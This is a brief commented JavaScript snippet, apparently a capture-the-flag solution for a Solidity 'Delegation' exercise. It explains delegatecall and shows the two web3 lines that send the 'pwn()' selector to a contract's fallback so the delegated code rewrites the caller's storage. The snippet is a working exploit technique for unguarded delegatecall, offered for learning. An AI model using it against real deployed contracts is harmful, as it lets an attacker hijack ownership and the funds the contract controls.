/*

This example illustrates the delegatecall function, which is a low level function provided by solidity. This delegates the incoming transaction from contract 1 to another contract 2, while using the same storage as contract 1. Thus changes to the state are made in contract 1, but the implementation is in contract 2 

To call a function using delegatecall, we need to send a transaction to Delegation contract (thus calling the fallback function) passing it first four digits of the function signature of the pwn() function in the data parameter

Function signature can be calculated using keccak256 in solidity code or web3 library function in console itself 

*/

// Encode and get the first 4 digits of function signature
fun_sig = web3.eth.abi.encodeFunctionSignature('pwn()');

// Create a transaction and use fun_sig as value for the data parameter
contract.sendTransaction({data: fun_sig});
